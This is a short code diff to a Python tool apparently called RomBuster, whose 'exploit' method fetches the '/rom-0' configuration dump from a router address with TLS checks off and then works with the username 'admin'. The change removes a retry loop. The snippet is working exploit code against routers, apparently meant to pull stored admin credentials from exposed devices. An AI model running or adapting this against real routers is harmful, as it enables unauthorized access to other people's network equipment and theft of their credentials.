@@ -35,21 +35,14 @@ from .deps.lzs_decompress import LZSDecompress, RingList
 class RomBuster:
     @staticmethod
     def exploit(address):
-        content = b''
-        while not content:
-            try:
-                response = requests.get(
-                    f"http://{address}/rom-0",
-                    verify=False,
-                    timeout=3
-                )
-            except Exception:
-                return None
-
-            if response.status_code == 200:
-                content = response.content
-            else:
-                return None
+        try:
+            response = requests.get(
+                f"http://{address}/rom-0",
+                verify=False,
+                timeout=3
+            )
+        except Exception:
+            return None
 
         username = 'admin'
         try:
